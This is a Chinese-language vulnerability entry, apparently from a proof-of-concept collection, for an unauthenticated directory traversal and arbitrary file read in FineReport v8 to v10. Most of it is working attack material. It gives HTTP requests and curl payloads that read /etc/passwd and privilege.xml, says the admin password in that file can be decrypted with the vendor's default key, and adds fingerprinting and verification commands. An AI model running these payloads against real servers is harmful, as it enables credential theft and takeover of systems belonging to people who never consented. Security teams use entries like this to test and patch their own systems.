---
id: FINEREPORT-DIRECTORY-TRAVERSAL
title: 帆软FineReport 目录遍历任意文件读取漏洞
product: finereport
vendor: 帆软软件
version_affected: "v10.0, v9.0, v8.0"
severity: HIGH
tags: [file_read, path_traversal, 国产, 无需认证]
fingerprint: ["FineReport", "帆软", "/WebReport/", "/ReportServer", "fr_log"]
---

## 漏洞描述

帆软FineReport多个版本存在目录遍历漏洞，可读取服务器任意文件。

## 影响版本

- FineReport v10.0
- FineReport v9.0
- FineReport v8.0

## 前置条件

- 目标运行帆软 FineReport 且可通过网络访问
- ReportServer 接口未做访问限制
- 无需认证

## 利用步骤

### 目录遍历读取文件

```http
GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
Host: target
```

读取系统文件:
```http
GET /WebReport/ReportServer?op=resource&resource=/com/fr/web/../../../../../etc/passwd HTTP/1.1
Host: target
```

### 读取管理员密码

```http
GET /WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../WebReport/WEB-INF/resources/privilege.xml&currentUserName=admin&currentUserId=1&is498498=true HTTP/1.1
Host: target
```

`privilege.xml` 中包含加密的管理员密码，可使用帆软默认密钥解密。

## Payload

### 读取 privilege.xml（管理员密码）

```bash
curl -s "http://target/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
```

### 目录遍历读取系统文件

```bash
curl -s "http://target/WebReport/ReportServer?op=resource&resource=/com/fr/web/../../../../../etc/passwd"
```

### 读取管理员配置

```bash
curl -s "http://target/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../WebReport/WEB-INF/resources/privilege.xml&currentUserName=admin&currentUserId=1&is498498=true"
```

## 验证方法

- 响应中包含 `<AdminPassword>` 标签或加密的管理员密码即确认 privilege.xml 读取成功
- 响应中包含 `root:x:0:0:` 等内容即确认任意文件读取漏洞存在

```bash
curl -s "http://target/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml" | grep -i "password\|admin"
```

## 指纹确认

```bash
curl -s http://target/WebReport/ReportServer
curl -s http://target/WebReport/ | grep -i "FineReport\|帆软"
```
